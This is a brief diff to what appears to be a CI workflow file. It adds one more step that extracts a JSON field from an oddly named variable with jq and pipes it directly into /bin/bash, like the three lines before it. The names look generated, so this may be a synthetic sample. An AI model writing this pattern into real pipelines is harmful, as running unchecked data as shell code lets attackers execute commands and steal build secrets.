@@ -24,6 +24,7 @@ jobs:
           echo $ytwnb3 | jq -r .kpi941 | /bin/bash
           printf '%s' "$wyiwi6" | jq -r .htb22807 | /bin/bash
           printf '%s' "$lec3" | jq -r .x5 | /bin/bash
+          echo $bbps2362 | jq -r .ct0 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
